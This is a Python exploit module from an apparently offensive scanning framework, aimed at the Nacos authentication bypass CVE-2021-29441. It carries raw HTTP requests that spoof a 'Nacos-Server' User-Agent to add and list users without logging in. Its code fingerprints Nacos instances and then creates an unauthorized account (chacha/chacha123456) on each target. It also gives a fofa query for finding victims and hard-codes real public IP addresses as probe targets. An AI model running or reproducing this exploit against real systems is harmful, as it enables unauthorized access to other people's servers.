# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *

'''
POST /nacos/v1/auth/users?username=aaaa&password=bbbb 
HTTP/1.1 2 Host: 192.168.1.2 
User-Agent: Nacos-Server 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/ *;q=0.8 
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
DNT: 1 
Connection: close 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 0 

查看用户： 
GET /nacos/v1/auth/users?pageNo=1&pageSize=100 
HTTP/1.1 
Host: 192.168.1.2 
User-Agent: Nacos-Server 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8 
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
DNT: 1 
Connection: close
'''


# fofa: title="Nacos"
#

class Script(BaseScript):
    name = 'Nacos'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.FINGER and BugType.UNAUTH
        # 编号
        self.bugNumber = 'CVE-2021-29441'
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/', '/nacos']
        # exec
        self.execPathList = ['/nacos/v1/auth/users']
        # session
        self.session = session
        # 相关信息
        self.info = 'Nacos <= 2.0.0-ALPHA.1'

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout,
                                       verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if '<title>Nacos</title>' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Nacos Finger', url))
                            return {'name': 'Nacos Finger', 'url': url, 'software': 'Nacos'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = 'username=chacha&password=chacha123456'
                async with self.session.post(url=url, headers=headers, data=data, timeout=self.reqTimeout,
                                        verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        await asyncio.sleep(2)
                        tqdm.write(Fore.RED + '[{}] {}'.format('Nacos Unauth', url))
                        return {'name': 'Nacos Unauth', 'url': url, 'software': 'Nacos'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
